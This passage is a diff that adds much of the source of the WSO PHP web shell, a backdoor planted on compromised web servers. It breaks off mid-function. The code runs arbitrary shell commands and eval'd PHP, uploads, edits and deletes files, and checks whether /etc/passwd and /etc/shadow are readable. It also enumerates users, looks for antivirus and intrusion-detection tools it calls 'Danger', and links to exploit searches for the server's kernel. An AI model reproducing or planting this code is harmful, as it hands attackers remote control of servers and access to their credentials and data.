+    function processReqChange() {
+        if( (req.readyState == 4) )
+            if(req.status == 200) {
+                var reg = new RegExp(\"(\d+)([\S\s]*)\", 'm');
+                var arr=reg.exec(req.responseText);
+                eval(arr[2].substr(0, arr[1]));
+            } else alert('Request error!');
+    }
+</script>
+<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
+<form method=post name=mf style='display:none;'>
+<input type=hidden name=a>
+<input type=hidden name=c>
+<input type=hidden name=p1>
+<input type=hidden name=p2>
+<input type=hidden name=p3>
+<input type=hidden name=charset>
+</form>";
+        $freeSpace = @diskfreespace($GLOBALS['cwd']);
+        $totalSpace = @disk_total_space($GLOBALS['cwd']);
+        $totalSpace = $totalSpace ? $totalSpace : 1;
+        $release = @php_uname('r');
+        $kernel = @php_uname('s');
+        $explink = 'http://exploit-db.com/search/?action=search&filter_description=';
+        if (strpos('Linux', $kernel) !== false) $explink.= urlencode('Linux Kernel ' . substr($release, 0, 6));
+        else $explink.= urlencode($kernel . ' ' . substr($release, 0, 3));
+        if (!function_exists('posix_getegid')) {
+            $user = @get_current_user();
+            $uid = @getmyuid();
+            $gid = @getmygid();
+            $group = "?";
+        } else {
+            $uid = @posix_getpwuid(posix_geteuid());
+            $gid = @posix_getgrgid(posix_getegid());
+            $user = $uid['name'];
+            $uid = $uid['uid'];
+            $group = $gid['name'];
+            $gid = $gid['gid'];
+        }
+        $cwd_links = '';
+        $path = explode("/", $GLOBALS['cwd']);
+        $n = count($path);
+        for ($i = 0;$i < $n - 1;$i++) {
+            $cwd_links.= "<a href='#' onclick='g(\"FilesMan\",\"";
+            for ($j = 0;$j <= $i;$j++) $cwd_links.= $path[$j] . '/';
+            $cwd_links.= "\")'>" . $path[$i] . "/</a>";
+        }
+        $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
+        $opt_charsets = '';
+        foreach ($charsets as $item) $opt_charsets.= '<option value="' . $item . '" ' . ($_POST['charset'] == $item ? 'selected' : '') . '>' . $item . '</option>';
+        $m = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql', 'Php' => 'Php', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network');
+        if (!empty($GLOBALS['auth_pass'])) $m['Logout'] = 'Logout';
+        $m['Self remove'] = 'SelfRemove';
+        $menu = '';
+        foreach ($m as $k => $v) $menu.= '<th width="' . (int)(100 / count($m)) . '%">[ <a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')">' . $k . '</a> ]</th>';
+        $drives = "";
+        if ($GLOBALS['os'] == 'win') {
+            foreach (range('c', 'z') as $drive) if (is_dir($drive . ':\\'))
+            $drives .= ' <a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')" > ['.$drive.'] </a> ';
+    }
+    echo ' <table class=infocell padding=3 cellspacing=0 width=100%> <tr> <td width=1> <span> Uname: <br> User: <br> Php: <br> Hdd: <br> Cwd:
+                                ' . ($GLOBALS['os'] == 'win'?' <br> Drives:
+                                    ':'') . ' </span> </td> '
+       . ' <td> <nobr> ' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '"target = _blank > [exploit - db . com] </a> </nobr> <br> ' . $uid . '(' . $user . ') <span> Group: </span> ' . $gid . '(' . $group . ') <br> ' . @phpversion() . ' <span> Safemode: </span> ' . ($GLOBALS['safe_mode']?' <font color=red > ON </font> ':' <font color=green > <b> OFF </b> </font> ')
+       . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($totalSpace) . ' <span>Free:</span> ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'
+                                             . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
+                                        }
+                                        function wsoFooter() {
+                                            $is_writable = is_writable($GLOBALS['cwd']) ? " <font color='green'>(Writeable)</font>" : " <font color=red>(Not writable)</font>";
+                                            echo "
+</div>
+<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
+    <tr>
+        <td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=submit value='>>'></form></td>
+        <td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
+    </tr><tr>
+        <td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
+        <td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
+    </tr><tr>
+        <td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
+        <td><form method='post' ENCTYPE='multipart/form-data'>
+        <input type=hidden name=a value='FilesMAn'>
+        <input type=hidden name=c value='" . $GLOBALS['cwd'] . "'>
+        <input type=hidden name=p1 value='uploadFile'>
+        <input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
+        <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
+    </tr></table></div></body></html>";
+                                        }
+                                        if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false)) {
+                                            function posix_getpwuid($p) {
+                                                return false;
+                                            }
+                                        }
+                                        if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false)) {
+                                            function posix_getgrgid($p) {
+                                                return false;
+                                            }
+                                        }
+                                        function wsoEx($in) {
+                                            $out = '';
+                                            if (function_exists('exec')) {
+                                                @exec($in, $out);
+                                                $out = @join("
+", $out);
+                                            } elseif (function_exists('passthru')) {
+                                                ob_start();
+                                                @passthru($in);
+                                                $out = ob_get_clean();
+                                            } elseif (function_exists('system')) {
+                                                ob_start();
+                                                @system($in);
+                                                $out = ob_get_clean();
+                                            } elseif (function_exists('shell_exec')) {
+                                                $out = shell_exec($in);
+                                            } elseif (is_resource($f = @popen($in, "r"))) {
+                                                $out = "";
+                                                while (!@feof($f)) $out.= fread($f, 1024);
+                                                pclose($f);
+                                            }
+                                            return $out;
+                                        }
+                                        function wsoViewSize($s) {
+                                            if (is_int($s)) $s = sprintf("%u", $s);
+                                            if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
+                                            elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
+                                            elseif ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
+                                            else return $s . ' B';
+                                        }
+                                        function wsoPerms($p) {
+                                            if (($p & 0xC000) == 0xC000) $i = 's';
+                                            elseif (($p & 0xA000) == 0xA000) $i = 'l';
+                                            elseif (($p & 0x8000) == 0x8000) $i = '-';
+                                            elseif (($p & 0x6000) == 0x6000) $i = 'b';
+                                            elseif (($p & 0x4000) == 0x4000) $i = 'd';
+                                            elseif (($p & 0x2000) == 0x2000) $i = 'c';
+                                            elseif (($p & 0x1000) == 0x1000) $i = 'p';
+                                            else $i = 'u';
+                                            $i.= (($p & 0x0100) ? 'r' : '-');
+                                            $i.= (($p & 0x0080) ? 'w' : '-');
+                                            $i.= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
+                                            $i.= (($p & 0x0020) ? 'r' : '-');
+                                            $i.= (($p & 0x0010) ? 'w' : '-');
+                                            $i.= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
+                                            $i.= (($p & 0x0004) ? 'r' : '-');
+                                            $i.= (($p & 0x0002) ? 'w' : '-');
+                                            $i.= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
+                                            return $i;
+                                        }
+                                        function wsoPermsColor($f) {
+                                            if (!@is_readable($f)) return '<font color=#FF0000>' . wsoPerms(@fileperms($f)) . '</font>';
+                                            elseif (!@is_writable($f)) return '<font color=white>' . wsoPerms(@fileperms($f)) . '</font>';
+                                            else return '<font color=#25ff00>' . wsoPerms(@fileperms($f)) . '</font>';
+                                        }
+                                        function wsoScandir($dir) {
+                                            if (function_exists("scandir")) {
+                                                return scandir($dir);
+                                            } else {
+                                                $dh = opendir($dir);
+                                                while (false !== ($filename = readdir($dh))) $files[] = $filename;
+                                                return $files;
+                                            }
+                                        }
+                                        function wsoWhich($p) {
+                                            $path = wsoEx('which ' . $p);
+                                            if (!empty($path)) return $path;
+                                            return false;
+                                        }
+                                        function actionSecInfo() {
+                                            wsoHeader();
+                                            echo '<h1>Server security information</h1><div class=content>';
+                                            function wsoSecParam($n, $v) {
+                                                $v = trim($v);
+                                                if ($v) {
+                                                    echo '<span>' . $n . ': </span>';
+                                                    if (strpos($v, "
+") === false) echo $v . '<br>';
+                                                    else echo '<pre class=ml1>' . $v . '</pre>';
+                                                }
+                                            }
+                                            wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
+                                            if (function_exists('apache_get_modules')) wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
+                                            wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions'] ? $GLOBALS['disable_functions'] : 'none');
+                                            wsoSecParam('Open base dir', @ini_get('open_basedir'));
+                                            wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
+                                            wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
+                                            wsoSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no');
+                                            $temp = array();
+                                            if (function_exists('mysql_get_client_info')) $temp[] = "MySql (" . mysql_get_client_info() . ")";
+                                            if (function_exists('mssql_connect')) $temp[] = "MSSQL";
+                                            if (function_exists('pg_connect')) $temp[] = "PostgreSQL";
+                                            if (function_exists('oci_connect')) $temp[] = "Oracle";
+                                            wsoSecParam('Supported databases', implode(', ', $temp));
+                                            echo '<br>';
+                                            if ($GLOBALS['os'] == 'nix') {
+                                                wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : 'no');
+                                                wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>" : 'no');
+                                                wsoSecParam('OS version', @file_get_contents('/proc/version'));
+                                                wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
+                                                if (!$GLOBALS['safe_mode']) {
+                                                    $userful = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
+                                                    $danger = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
+                                                    $downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
+                                                    echo '<br>';
+                                                    $temp = array();
+                                                    foreach ($userful as $item) if (wsoWhich($item)) $temp[] = $item;
+                                                    wsoSecParam('Userful', implode(', ', $temp));
+                                                    $temp = array();
+                                                    foreach ($danger as $item) if (wsoWhich($item)) $temp[] = $item;
+                                                    wsoSecParam('Danger', implode(', ', $temp));
+                                                    $temp = array();
+                                                    foreach ($downloaders as $item) if (wsoWhich($item)) $temp[] = $item;
+                                                    wsoSecParam('Downloaders', implode(', ', $temp));
+                                                    echo '<br/>';
+                                                    wsoSecParam('HDD space', wsoEx('df -h'));
+                                                    wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
+                                                    echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
+                                                    if (isset($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) {
+                                                        $temp = "";
+                                                        for (;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
+                                                            $uid = @posix_getpwuid($_POST['p2']);
+                                                            if ($uid) $temp.= join(':', $uid) . "
+";
+                                                        }
+                                                        echo '<br/>';
+                                                        wsoSecParam('Users', $temp);
+                                                    }
+                                                }
+                                            } else {
+                                                wsoSecParam('OS Version', wsoEx('ver'));
+                                                wsoSecParam('Account Settings', wsoEx('net accounts'));
+                                                wsoSecParam('User Accounts', wsoEx('net user'));
+                                            }
+                                            echo '</div>';
+                                            wsoFooter();
+                                        }
+                                        function actionPhp() {
+                                            if (isset($_POST['ajax'])) {
+                                                WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
+                                                ob_start();
+                                                eval($_POST['p1']);
+                                                $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "
+
+	\' ") . "';
+";
+                                                echo strlen($temp), "
+", $temp;
+                                                exit;
+                                            }
+                                            if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
+                                            wsoHeader();
+                                            if (isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
+                                                echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
+                                                ob_start();
+                                                phpinfo();
+                                                $tmp = ob_get_clean();
+                                                $tmp = preg_replace(array('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU', '!td, th {(.*)}!msiU', '!<img[^>]+>!msiU',), array('', '.e, .v, .h, .h th {$1}', ''), $tmp);
+                                                echo str_replace('<h1', '<h2', $tmp) . '</div><br>';
+                                            }
+                                            echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">';
+                                            echo ' <input type=checkbox name=ajax value=1 ' . ($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX</form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';
+                                            if (!empty($_POST['p1'])) {
+                                                ob_start();
+                                                eval($_POST['p1']);
+                                                echo htmlspecialchars(ob_get_clean());
+                                            }
+                                            echo '</pre></div>';
+                                            wsoFooter();
+                                        }
+                                        function actionFilesMan() {
+                                            if (!empty($_COOKIE['f'])) $_COOKIE['f'] = @unserialize($_COOKIE['f']);
+                                            if (!empty($_POST['p1'])) {
+                                                switch ($_POST['p1']) {
+                                                    case 'uploadFile':
+                                                        if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) echo "Can't upload!";
+                                                        break;
+                                                    case 'mkdir':
+                                                        if (!@mkdir($_POST['p2'])) echo "Can't create!";
+                                                        break;
+                                                    case 'delete':
+                                                        function deleteDir($path) {
+                                                            $path = (substr($path, -1) == '/') ? $path : $path . '/';
+                                                            $dh = opendir($path);
+                                                            while (($item = readdir($dh)) !== false) {
+                                                                $item = $path . $item;
+                                                                if ((basename($item) == "..") || (basename($item) == ".")) continue;
+                                                                $type = filetype($item);
+                                                                if ($type == "dir") deleteDir($item);
+                                                                else @unlink($item);
+                                                            }
+                                                            closedir($dh);
+                                                            @rmdir($path);
+                                                        }
+                                                        if (is_array(@$_POST['f'])) foreach ($_POST['f'] as $f) {
+                                                            if ($f == '..') continue;
+                                                            $f = urldecode($f);
+                                                            if (is_dir($f)) deleteDir($f);
+                                                            else @unlink($f);
+                                                        }
+                                                        break;
+                                                    case 'paste':
+                                                        if ($_COOKIE['act'] == 'copy') {
+                                                            function copy_paste($c, $s, $d) {
+                                                                if (is_dir($c . $s)) {
+                                                                    mkdir($d . $s);
+                                                                    $h = @opendir($c . $s);
+                                                                    while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');
+                                                                } elseif (is_file($c . $s)) @copy($c . $s, $d . $s);
+                                                            }
+                                                            foreach ($_COOKIE['f'] as $f) copy_paste($_COOKIE['c'], $f, $GLOBALS['cwd']);
+                                                        } elseif ($_COOKIE['act'] == 'move') {
+                                                            function move_paste($c, $s, $d) {
+                                                                if (is_dir($c . $s)) {
+                                                                    mkdir($d . $s);
+                                                                    $h = @opendir($c . $s);
+                                                                    while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');
+                                                                } elseif (@is_file($c . $s)) @copy($c . $s, $d . $s);
+                                                            }
+                                                            foreach ($_COOKIE['f'] as $f) @rename($_COOKIE['c'] . $f, $GLOBALS['cwd'] . $f);
+                                                        } elseif ($_COOKIE['act'] == 'zip') {
+                                                            if (class_exists('ZipArchive')) {
+                                                                $zip = new ZipArchive();
+                                                                if ($zip->open($_POST['p2'], 1)) {
+                                                                    chdir($_COOKIE['c']);
+                                                                    foreach ($_COOKIE['f'] as $f) {
+                                                                        if ($f == '..') continue;
+                                                                        if (@is_file($_COOKIE['c'] . $f)) $zip->addFile($_COOKIE['c'] . $f, $f);
+                                                                        elseif (@is_dir($_COOKIE['c'] . $f)) {
+                                                                            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/', FilesystemIterator::SKIP_DOTS));
+                                                                            foreach ($iterator as $key => $value) {
+                                                                                $zip->addFile(realpath($key), $key);
+                                                                            }
+                                                                        }
+                                                                    }
+                                                                    chdir($GLOBALS['cwd']);
+                                                                    $zip->close();
+                                                                }
+                                                            }
+                                                        } elseif ($_COOKIE['act'] == 'unzip') {
+                                                            if (class_exists('ZipArchive')) {
+                                                                $zip = new ZipArchive();
+                                                                foreach ($_COOKIE['f'] as $f) {
+                                                                    if ($zip->open($_COOKIE['c'] . $f)) {
+                                                                        $zip->extractTo($GLOBALS['cwd']);
+                                                                        $zip->close();
+                                                                    }
+                                                                }
+                                                            }
+                                                        } elseif ($_COOKIE['act'] == 'tar') {
+                                                            chdir($_COOKIE['c']);
+                                                            $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
+                                                            wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
+                                                            chdir($GLOBALS['cwd']);
+                                                        }
+                                                        unset($_COOKIE['f']);
+                                                        setcookie('f', '', time() - 3600);
+                                                        break;
+                                                    default:
+                                                        if (!empty($_POST['p1'])) {
+                                                            WSOsetcookie('act', $_POST['p1']);
+                                                            WSOsetcookie('f', serialize(@$_POST['f']));
+                                                            WSOsetcookie('c', @$_POST['c']);
+                                                        }
+                                                        break;
+                                                    }
+                                                }
+                                                wsoHeader();
+                                                echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
+                                                $dirContent = wsoScandir(isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd']);
+                                                if ($dirContent === false) {
+                                                    echo 'Can\'t open this folder!';
+                                                    wsoFooter();
+                                                    return;
+                                                }
+                                                global $sort;
+                                                $sort = array('name', 1);
+                                                if (!empty($_POST['p1'])) {
+                                                    if (preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]);
+                                                }
+                                                echo "<script>
+    function sa() {
+        for(i=0;i<d.files.elements.length;i++)
+            if(d.files.elements[i].type == 'checkbox')
+                d.files.elements[i].checked = d.files.elements[0].checked;
+    }
+</script>
+<table width='100%' class='main' cellspacing='0' cellpadding='2'>
+<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
+                                                $dirs = $files = array();
+                                                $n = count($dirContent);
+                                                for ($i = 0;$i < $n;$i++) {
+                                                    $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
+                                                    $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
+                                                    $tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'] . $dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => wsoPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));
+                                                    if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file'));
+                                                    elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
+                                                    elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'dir'));
+                                                }
+                                                $GLOBALS['sort'] = $sort;
+                                                function wsoCmp($a, $b) {
+                                                    if ($GLOBALS['sort'][0] != 'size') return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]])) * ($GLOBALS['sort'][1] ? 1 : -1);
+                                                    else return (($a['size'] < $b['size']) ? -1 : 1) * ($GLOBALS['sort'][1] ? 1 : -1);
+                                                }
+                                                usort($files, "wsoCmp");
+                                                usort($dirs, "wsoCmp");
+                                                $files = array_merge($dirs, $files);
+                                                $l = 0;
+                                                foreach ($files as $f) {
+                                                    echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . (($f['type'] == 'file') ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" ' . (empty($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . (($f['type'] == 'file') ? wsoViewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . (($f['type'] == 'file') ? ' <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
+                                                    $l = $l ? 0 : 1;
+                                                }
+                                                echo "<tr><td colspan=7>
+    <input type=hidden name=a value='FilesMan'>
+    <input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'>
+    <input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
+    <select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
+                                                if (class_exists('ZipArchive')) echo "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>";
+                                                echo "<option value='tar'>Compress (tar.gz)</option>";
+                                                if (!empty($_COOKIE['act']) && @count($_COOKIE['f'])) echo "<option value='paste'>Paste / Compress</option>";
+                                                echo "</select>&nbsp;";
+                                                if (!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar'))) echo "file name: <input type=text name=p2 value='wso_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . "'>&nbsp;";
+                                                echo "<input type='submit' value='>>'></td></tr></form></table></div>";
+                                                wsoFooter();
+                                            }
+                                            function actionStringTools() {
+                                                if (!function_exists('hex2bin')) {
+                                                    function hex2bin($p) {
+                                                        return decbin(hexdec($p));
+                                                    }
+                                                }
+                                                if (!function_exists('binhex')) {
+                                                    function binhex($p) {
+                                                        return dechex(bindec($p));
+                                                    }
+                                                }
+                                                if (!function_exists('hex2ascii')) {
+                                                    function hex2ascii($p) {
+                                                        $r = '';
+                                                        for ($i = 0;$i < strLen($p);$i+= 2) {
+                                                            $r.= chr(hexdec($p[$i] . $p[$i + 1]));
+                                                        }
+                                                        return $r;
+                                                    }
+                                                }
+                                                if (!function_exists('ascii2hex')) {
+                                                    function ascii2hex($p) {
+                                                        $r = '';
+                                                        for ($i = 0;$i < strlen($p);++$i) $r.= sprintf('%02X', ord($p[$i]));
+                                                        return strtoupper($r);
+                                                    }
+                                                }
+                                                if (!function_exists('full_urlencode')) {
+                                                    function full_urlencode($p) {
+                                                        $r = '';
+                                                        for ($i = 0;$i < strlen($p);++$i) $r.= '%' . dechex(ord($p[$i]));
+                                                        return strtoupper($r);
+                                                    }
+                                                }
+                                                $stringTools = array('Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen',);
+                                                if (isset($_POST['ajax'])) {
+                                                    WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
+                                                    ob_start();
+                                                    if (in_array($_POST['p1'], $stringTools)) echo $_POST['p1']($_POST['p2']);
+                                                    $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "
+
+	\' ") . "';
+";
+                                                    echo strlen($temp), "
+", $temp;
+                                                    exit;
+                                                }
+                                                if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
+                                                wsoHeader();
+                                                echo '<h1>String conversions</h1><div class=content>';
+                                                echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
+                                                foreach ($stringTools as $k => $v) echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
+                                                echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 " . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . "> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
+                                                if (!empty($_POST['p1'])) {
+                                                    if (in_array($_POST['p1'], $stringTools)) echo htmlspecialchars($_POST['p1']($_POST['p2']));
+                                                }
+                                                echo "</pre></div><br><h1>Search files:</h1><div class=content>
+        <form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
+            <tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
+            <tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS['cwd']) . "' style='width:100%'></td></tr>
